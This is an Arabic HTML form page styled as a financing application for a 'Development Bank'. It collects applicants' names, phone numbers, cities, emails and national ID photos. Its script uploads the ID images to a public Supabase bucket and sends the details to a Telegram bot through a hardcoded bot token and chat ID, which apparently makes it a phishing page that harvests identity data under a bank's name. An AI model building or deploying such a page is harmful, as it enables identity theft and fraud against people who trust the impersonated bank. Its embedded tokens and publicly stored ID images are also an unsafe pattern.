<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تقديم طلب | بنك التنمية</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.39.7/dist/umd/supabase.js"></script>
    <style>
        :root { --primary: #006c35; --bg: #f4f7f5; }
        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); direction: rtl; padding: 20px; }
        .form-container { max-width: 500px; margin: auto; background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
        h2 { text-align: center; color: var(--primary); }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; }
        button { width: 100%; padding: 15px; background: var(--primary); color: white; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; font-size: 1.1rem; }
        #loading { display: none; text-align: center; color: var(--primary); margin-top: 10px; font-weight: bold; }
    </style>
</head>
<body>

<div class="form-container">
    <h2 id="formTitle">تعبئة بيانات الطلب</h2>
    <form id="applyForm">
        <input type="text" id="fullName" placeholder="الاسم الكامل" required>
        <input type="tel" id="phone" placeholder="رقم الجوال" required>
        <input type="text" id="address" placeholder="المدينة" required>
        <input type="email" id="email" placeholder="البريد الإلكتروني" required>
        <label style="font-size: 0.8rem; color: #666;">صورة الهوية الوطنية:</label>
        <input type="file" id="idCard" accept="image/*" required>
        <button type="submit" id="submitBtn">اعتماد وإرسال الطلب</button>
    </form>
    <div id="loading">⏳ جاري الإرسال.. لا تقفل الصفحة</div>
</div>

<script>
    // التأكد من أن المكتبة تم تحميلها
    const { createClient } = supabase;

    const SUPABASE_URL = 'https://fyaxiwtkjdjmgfovsfmb.supabase.co';
    const SUPABASE_KEY = 'EyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZ5YXhpd2t0amRqbWdmb3ZzZm1iIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY5Njc5MzcsImV4cCI6MjA5MjU0MzkzN30.gdkzSZJIlaOVSiLgvEy_wKV9cq1ZAMIkM8DMB9yvpgU';
    
    // تعريف العميل بطريقة ثابتة
    const _supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

    const TG_TOKEN = '8688016586:AAFEd6EBgeu5pTWtLTstuN2YFsZytQBWwH8';
    const TG_CHAT_ID = '5516597110';

    document.getElementById('applyForm').onsubmit = async (e) => {
        e.preventDefault();
        const btn = document.getElementById('submitBtn');
        const loader = document.getElementById('loading');
        
        btn.style.display = 'none';
        loader.style.display = 'block';

        const file = document.getElementById('idCard').files[0];
        const orderNum = 'SDB-' + Math.floor(10000 + Math.random() * 90000);
        const selectedFinance = localStorage.getItem('selectedFinance') || 'تمويل عام';

        try {
            // 1. رفع الصورة
            const fileName = `${Date.now()}-${file.name}`;
            const { data: upData, error: upError } = await _supabase.storage
                .from('identity_cards')
                .upload(fileName, file);

            if (upError) throw upError;

            const imgUrl = `${SUPABASE_URL}/storage/v1/object/public/identity_cards/${fileName}`;

            // 2. إدخال البيانات في الجدول
            const { error: dbError } = await _supabase
                .from('applications')
                .insert([{
                    order_number: orderNum,
                    full_name: document.getElementById('fullName').value,
                    phone: document.getElementById('phone').value,
                    address: document.getElementById('address').value,
                    email: document.getElementById('email').value,
                    finance_type: selectedFinance,
                    id_card_url: imgUrl,
                    status: 'pending'
                }]);

            if (dbError) throw dbError;

            // 3. إرسال تليجرام
            const text = `🔔 طلب جديد: ${selectedFinance}\n🔢 رقم الطلب: ${orderNum}\n👤 الاسم: ${document.getElementById('fullName').value}\n📞 الجوال: ${document.getElementById('phone').value}\n🖼 الصورة: ${imgUrl}`;
            
            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TG_CHAT_ID, text: text })
            });

            alert('تم بنجاح! رقم طلبك: ' + orderNum);
            window.location.href = 'index.html';

        } catch (err) {
            console.error(err);
            alert('حدث خطأ: ' + (err.message || 'تأكد من إعدادات الـ Storage والجدول'));
            btn.style.display = 'block';
            loader.style.display = 'none';
        }
    };
</script>
</body>
</html>
